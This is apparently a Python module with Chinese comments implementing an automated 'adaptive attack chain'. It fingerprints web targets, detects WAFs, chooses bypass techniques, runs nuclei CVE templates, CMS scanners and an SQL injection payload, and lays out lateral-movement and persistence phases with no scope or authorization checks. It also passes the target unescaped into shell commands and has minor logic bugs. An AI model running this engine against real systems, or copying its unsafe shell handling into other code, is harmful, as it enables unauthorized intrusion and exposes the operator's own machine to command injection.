"""
自适应攻击链引擎 v1.0 — Adaptive Attack Chain
───────────────────────────────────────────
特性:
  • 探测目标环境 → 自动切换攻击策略
  • WAF/IDS检测 → 自动选择绕过方案
  • Web框架识别 → 加载专用Payload
  • 域控发现 → 自动切换到内网模式
  • IIS/Apache/Nginx → 差异化攻击路径
  • 失败自动降级 → 更保守策略重试
  • 攻击链状态机: 信息收集→打点→提权→横向→持久化

用法:
  from .adaptive_chain import AdaptiveChain

  ac = AdaptiveChain(project_id=5)
  ac.run(target="https://target.com")
  # → 自动检测环境 → 选择最优攻击链 → 执行 → 报告
"""

import subprocess, json, time, os, re
from pathlib import Path
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Callable, Tuple
from enum import Enum, auto

from . import db
from .playbook import Playbook, run_recon, run_port_scan, run_web_scan, run_vuln_scan
from .waf_evasion import WAFEvader

# ==================== 状态机 ====================

class AttackPhase(Enum):
    RECON = "recon"                # 信息收集
    PORT_SCAN = "port_scan"        # 端口扫描
    WEB_FINGERPRINT = "web_fp"     # Web指纹
    WAF_DETECT = "waf_detect"      # WAF检测
    EXPLOIT = "exploit"            # 漏洞利用
    PRIVESC = "privesc"            # 提权
    LATERAL = "lateral"            # 横向移动
    PERSIST = "persist"            # 持久化
    REPORT = "report"              # 报告

class ChainStrategy(Enum):
    """攻击策略"""
    AGGRESSIVE = "aggressive"      # 激进: 所有漏洞都试
    STEALTH = "stealth"            # 隐蔽: 低频慢速
    WAF_BYPASS = "waf_bypass"      # WAF绕过模式
    INTERNAL = "internal"          # 内网模式
    CTF = "ctf"                    # CTF快速模式
    WEB_ONLY = "web_only"          # 仅Web
    FULL_CHAIN = "full_chain"      # 全攻击链

# ==================== 数据模型 ====================

@dataclass
class TargetProfile:
    """目标环境画像"""
    target: str
    ip: str = ""
    os: str = ""                     # Windows/Linux/Unknown
    web_server: str = ""             # nginx/apache/iis/tomcat/unknown
    cms: str = ""                    # wordpress/drupal/joomla/...
    languages: List[str] = field(default_factory=list)  # php/python/java/...
    waf: str = ""                    # cloudflare/aws/modsecurity/...
    has_domain_controller: bool = False
    has_ms_sql: bool = False
    open_ports: List[int] = field(default_factory=list)
    detected_tech: List[str] = field(default_factory=list)
    is_cloud: bool = False           # AWS/Azure/GCP
    risk_score: int = 0              # 1-10 目标防御强度

@dataclass
class AttackAction:
    """攻击链中的一个动作"""
    phase: AttackPhase
    tool: str
    command: str
    target: str
    payload: str = ""
    strategy: ChainStrategy = ChainStrategy.AGGRESSIVE
    timeout: int = 120
    depends_on: List[str] = field(default_factory=list)  # 依赖的前置动作

@dataclass
class ChainResult:
    """攻击链执行结果"""
    action: AttackAction
    success: bool
    output: str
    findings: List[str] = field(default_factory=list)
    next_actions: List[AttackAction] = field(default_factory=list)
    error: str = ""


# ==================== 环境探测器 ====================

class EnvironmentDetector:
    """探测目标环境，生成画像"""

    @staticmethod
    def detect(target: str) -> TargetProfile:
        """
        自动探测目标环境
        
        检测顺序:
          1. whatweb → 框架/CMS
          2. httpx → 存活+技术栈
          3. wafw00f → WAF
          4. nmap → 端口+OS
        """
        profile = TargetProfile(target=target)

        try:
            # 1. whatweb
            ww_cmd = f"whatweb {target} --no-errors 2>/dev/null"
            ww_out = subprocess.run(ww_cmd, shell=True, capture_output=True, text=True, timeout=30).stdout.lower()

            # 框架识别
            framework_map = {
                "wordpress": "wordpress", "drupal": "drupal", "joomla": "joomla",
                "django": "django", "flask": "flask", "laravel": "laravel",
                "spring": "spring", "struts": "struts2", "tomcat": "tomcat",
                "iis": "iis", "nginx": "nginx", "apache": "apache",
                "react": "react", "vue": "vue", "angular": "angular",
            }
            for keyword, framework in framework_map.items():
                if keyword in ww_out and framework not in profile.detected_tech:
                    profile.detected_tech.append(framework)

            # CMS
            if "wordpress" in ww_out: profile.cms = "wordpress"
            elif "drupal" in ww_out: profile.cms = "drupal"
            elif "joomla" in ww_out: profile.cms = "joomla"

            # Web Server
            if "iis" in ww_out: profile.web_server = "iis"
            elif "nginx" in ww_out: profile.web_server = "nginx"
            elif "apache" in ww_out: profile.web_server = "apache"
            elif "tomcat" in ww_out: profile.web_server = "tomcat"

            # 语言检测
            lang_map = {"php": "php", "python": "python", "java": "java",
                       "asp.net": "dotnet", "ruby": "ruby", "node": "javascript"}
            for kw, lang in lang_map.items():
                if kw in ww_out and lang not in profile.languages:
                    profile.languages.append(lang)

            # 2. wafw00f
            waf_cmd = f"wafw00f {target} 2>/dev/null"
            waf_out = subprocess.run(waf_cmd, shell=True, capture_output=True, text=True, timeout=30).stdout
            for waf_name in ["Cloudflare", "AWS", "ModSecurity", "Fortinet", "F5", "Imperva",
                            "CloudFront", "Akamai", "Sucuri", "Wordfence", "Barracuda"]:
                if waf_name.lower() in waf_out.lower():
                    profile.waf = waf_name
                    profile.risk_score += 3
                    break

            # 3. httpx技术栈
            hx_cmd = f"echo '{target}' | httpx -silent -tech-detect -status-code -title 2>/dev/null"
            hx_out = subprocess.run(hx_cmd, shell=True, capture_output=True, text=True, timeout=30).stdout
            tech_keywords = ["aws", "azure", "gcp", "cloudflare", "google", "kubernetes",
                           "docker", "redis", "mysql", "postgresql", "mongodb"]
            for kw in tech_keywords:
                if kw in hx_out.lower() and kw not in profile.detected_tech:
                    profile.detected_tech.append(kw)

            # Cloud检测
            if any(c in ww_out + hx_out.lower() for c in ["aws", "amazon", "cloudfront"]):
                profile.is_cloud = True
                profile.risk_score += 1

        except Exception:
            pass

        # 风险评分
        if profile.waf: profile.risk_score += 3
        if profile.is_cloud: profile.risk_score += 2
        if not profile.detected_tech: profile.risk_score += 1  # 未知目标

        return profile


# ==================== 策略引擎 ====================

class StrategyEngine:
    """根据环境画像选择攻击策略"""

    # 框架 → 专用工具映射
    CMS_TOOLS = {
        "wordpress": "wpscan",
        "drupal": "droopescan",
        "joomla": "joomscan",
    }

    # Web Server → 专用Payload路径
    SERVER_PAYLOADS = {
        "iis": ["shortname", "webdav", "asp_upload", "iis_put"],
        "apache": ["htaccess", "cve-2021-41773", "cve-2021-42013"],
        "nginx": ["path_traversal", "crlf", "alias_traversal"],
        "tomcat": ["manager_brute", "cve-2017-12617", "war_upload"],
    }

    # WAF → 绕过策略
    WAF_STRATEGIES = {
        "Cloudflare": ["http2_smuggling", "chunked_bypass", "origin_ip"],
        "ModSecurity": ["comment_obfuscation", "case_variation", "null_byte"],
        "AWS": ["header_injection", "content_type_switch"],
        "Fortinet": ["chunked_transfer", "parameter_pollution"],
        "F5": ["smuggling_clte", "smuggling_tecl"],
    }

    @classmethod
    def select_strategy(cls, profile: TargetProfile) -> Tuple[ChainStrategy, List[AttackAction]]:
        """
        根据目标画像选择攻击策略和动作列表
        
        Returns:
            (主策略, 攻击动作列表)
        """
        actions = []

        # === WAF检测 → WAF绕过模式 ===
        if profile.waf:
            strategy = ChainStrategy.WAF_BYPASS
            bypass_methods = cls.WAF_STRATEGIES.get(profile.waf, ["generic_bypass"])
            actions.append(AttackAction(
                phase=AttackPhase.WAF_DETECT,
                tool="waf_evasion",
                command=f"waf_evade target={profile.target} waf={profile.waf}",
                target=profile.target,
                strategy=strategy,
            ))
        else:
            strategy = ChainStrategy.AGGRESSIVE

        # === CMS专用扫描 ===
        if profile.cms in cls.CMS_TOOLS:
            tool = cls.CMS_TOOLS[profile.cms]
            actions.append(AttackAction(
                phase=AttackPhase.EXPLOIT,
                tool=tool,
                command=f"{tool} --url {profile.target} --enumerate p,t,u --random-agent",
                target=profile.target,
                strategy=strategy,
            ))

        # === Web Server专用Payload ===
        if profile.web_server in cls.SERVER_PAYLOADS:
            for payload_type in cls.SERVER_PAYLOADS[profile.web_server]:
                actions.append(AttackAction(
                    phase=AttackPhase.EXPLOIT,
                    tool="nuclei",
                    command=f"nuclei -u {profile.target} -tags {payload_type} -silent",
                    target=profile.target,
                    strategy=strategy,
                    depends_on=["port_scan"]
                ))

        # === 语言专用扫描 ===
        lang_nuclei_tags = {
            "php": ["php", "phpunit", "laravel", "wordpress"],
            "python": ["django", "flask", "python"],
            "java": ["spring", "struts", "log4j", "jenkins"],
            "dotnet": ["asp", "dotnet", "exchange"],
            "javascript": ["node", "express", "nextjs"],
        }
        for lang in profile.languages:
            tags = lang_nuclei_tags.get(lang, [])
            for tag in tags:
                actions.append(AttackAction(
                    phase=AttackPhase.EXPLOIT,
                    tool="nuclei",
                    command=f"nuclei -u {profile.target} -tags {tag} -silent",
                    target=profile.target,
                    strategy=strategy,
                ))

        # === 通用漏洞扫描 ===
        actions.append(AttackAction(
            phase=AttackPhase.EXPLOIT,
            tool="nuclei",
            command=f"nuclei -u {profile.target} -severity critical,high -silent",
            target=profile.target,
            strategy=strategy,
        ))

        # === 如果有域控 → 内网模式 ===
        if profile.has_domain_controller:
            strategy = ChainStrategy.INTERNAL
            actions.append(AttackAction(
                phase=AttackPhase.LATERAL,
                tool="lateral_movement",
                command=f"lateral_move target={profile.target}",
                target=profile.target,
                strategy=strategy,
            ))

        return (strategy, actions)


# ==================== 自适应攻击链 ====================

class AdaptiveChain:
    """
    自适应攻击链引擎
    
    工作流程:
      1. 探测环境 → TargetProfile
      2. 选择策略 → Strategy + Actions
      3. 执行攻击动作 → 监控结果
      4. 根据结果调整 → 成功放大/失败降级
      5. 生成攻击链报告
    
    用例:
      ac = AdaptiveChain(project_id=5)
      profile = ac.probe("https://target.com")
      result = ac.run("https://target.com")
      # → 自动全流程
    """

    def __init__(self, project_id: int, uid: int = 0,
                 callback: Optional[Callable] = None):
        self.project_id = project_id
        self.uid = uid
        self.cb = callback or (lambda *a: None)
        self.detector = EnvironmentDetector()
        self.strategy_engine = StrategyEngine()
        self._profile: Optional[TargetProfile] = None
        self._actions_executed: List[ChainResult] = []
        self._findings: List[str] = []

    def _step(self, tool: str, target: str, status: str, msg: str = ""):
        self.cb(tool, target, status, msg)
        if status == "running":
            db.scan_start(self.project_id, self.uid, tool, target)

    def _run_cmd(self, cmd: str, timeout: int = 120) -> str:
        try:
            p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return (p.stdout or "") + (p.stderr or "")
        except subprocess.TimeoutExpired:
            return "[超时]"
        except Exception as e:
            return f"[错误: {e}]"

    def probe(self, target: str) -> TargetProfile:
        """探测目标环境，生成画像"""
        self._step("adaptive-probe", target, "running", "环境探测...")
        self._profile = self.detector.detect(target)

        # 记录画像
        db.scan_start(self.project_id, self.uid, "adaptive-probe", target)

        summary = (
            f"OS: {self._profile.os or '未知'}, "
            f"Server: {self._profile.web_server or '未知'}, "
            f"CMS: {self._profile.cms or '无'}, "
            f"WAF: {self._profile.waf or '无'}, "
            f"Risk: {self._profile.risk_score}/10"
        )
        self._step("adaptive-probe", target, "done", summary)
        return self._profile

    def run(self, target: str, force_strategy: Optional[ChainStrategy] = None,
            max_actions: int = 20) -> List[ChainResult]:
        """
        执行自适应攻击链
        
        Args:
            target: 目标URL
            force_strategy: 强制策略（可选）
            max_actions: 最大动作数
        
        Returns:
            所有动作的执行结果
        """
        # 阶段0: 探测
        if not self._profile:
            self.probe(target)

        # 阶段1: 选择策略
        strategy, actions = self.strategy_engine.select_strategy(self._profile)
        if force_strategy:
            strategy = force_strategy

        self._step("adaptive-chain", target, "running",
                   f"策略: {strategy.value}, {len(actions)} 个动作")

        # 阶段2: 执行动作
        results = []

        for action in actions[:max_actions]:
            # 检查依赖
            if action.depends_on:
                deps_ok = all(
                    any(r.action.phase.value == dep and r.success for r in results)
                    for dep in action.depends_on
                )
                if not deps_ok:
                    continue

            self._step(action.tool, action.target, "running",
                       f"阶段: {action.phase.value}")

            # WAF绕过模式 → 用WAFEvader
            if strategy == ChainStrategy.WAF_BYPASS and action.phase == AttackPhase.WAF_DETECT:
                evader = WAFEvader(target, "sqli")
                variants = evader.generate("1' OR '1'='1")
                bypass_results = evader.test_variants(variants)
                success = len(bypass_results.get("success", [])) > 0
                output = json.dumps(bypass_results)
            else:
                output = self._run_cmd(action.command, action.timeout)

            # 判断成功
            success = self._evaluate_success(output, action)

            # 解析发现
            findings = self._extract_findings(output, action)

            result = ChainResult(
                action=action, success=success, output=output[:1000],
                findings=findings
            )

            results.append(result)
            self._findings.extend(findings)

            status = f"✅ {len(findings)}个发现" if success else "❌"
            self._step(action.tool, action.target, "done", status)

            # 自适应: 成功 → 加大力度 / 失败 → 降级
            if success and strategy != ChainStrategy.AGGRESSIVE:
                # 成功了，可以尝试更激进的
                pass
            elif not success:
                # 失败降级: 减少并发, 增加延迟
                time.sleep(2)

        self._actions_executed = results

        # 阶段3: 汇总
        total_findings = sum(len(r.findings) for r in results)
        self._step("adaptive-chain", target, "done",
                   f"完成: {len(results)}个动作, {total_findings}个发现")

        return results

    def _evaluate_success(self, output: str, action: AttackAction) -> bool:
        """评估动作是否成功"""
        if not output or output.startswith("[错误"):
            return False
        if output.startswith("[超时"):
            return False
        # nuclei: 找到漏洞
        if action.tool == "nuclei" and ("[critical]" in output or "[high]" in output or "[medium]" in output):
            return True
        # wpscan: 找到漏洞
        if action.tool == "wpscan" and ("[!]" in output or "Vulnerability" in output):
            return True
        # 有输出且无错误
        return len(output) > 50 and "error" not in output.lower()[:200]

    def _extract_findings(self, output: str, action: AttackAction) -> List[str]:
        """从输出中提取发现"""
        findings = []
        for line in output.split("\n"):
            line = line.strip()
            if not line:
                continue
            # nuclei 发现
            if "[critical]" in line or "[high]" in line:
                findings.append(f"[{action.tool}] {line[:200]}")
            elif "[medium]" in line and action.tool == "nuclei":
                findings.append(f"[{action.tool}] {line[:200]}")
            # wpscan 发现
            elif "[!]" in line and action.tool == "wpscan":
                findings.append(f"[wpscan] {line[:200]}")
        return findings[:10]  # 最多10个

    def get_profile(self) -> Optional[TargetProfile]:
        """获取目标画像"""
        return self._profile

    def get_findings(self) -> List[str]:
        """获取所有发现"""
        return self._findings

    def summary(self) -> str:
        """生成攻击链摘要"""
        if not self._profile:
            return "尚未探测目标"

        lines = [
            f"自适应攻击链报告",
            f"{'─'*50}",
            f"目标: {self._profile.target}",
            f"环境: {self._profile.web_server}/{self._profile.cms or 'N/A'}",
            f"WAF: {self._profile.waf or '无'}",
            f"语言: {', '.join(self._profile.languages) if self._profile.languages else '未知'}",
            f"风险: {'🔴'* min(self._profile.risk_score//3, 3)}{'⚪'* (3 - min(self._profile.risk_score//3, 3))}",
            f"{'─'*50}",
            f"执行动作: {len(self._actions_executed)}",
            f"发现漏洞: {len(self._findings)}",
        ]

        if self._findings:
            lines.append(f"\n主要发现:")
            for f in self._findings[:10]:
                lines.append(f"  • {f}")

        return "\n".join(lines)


# ==================== 快捷函数 ====================

def adaptive_attack(target: str, project_id: int, uid: int = 0) -> Dict:
    """
    快捷自适应攻击
    
    Returns:
        {"profile": TargetProfile, "results": [...], "findings": [...], "summary": str}
    """
    ac = AdaptiveChain(project_id, uid)
    profile = ac.probe(target)
    results = ac.run(target)
    return {
        "profile": profile,
        "results": [r.__dict__ for r in results],
        "findings": ac.get_findings(),
        "summary": ac.summary()
    }
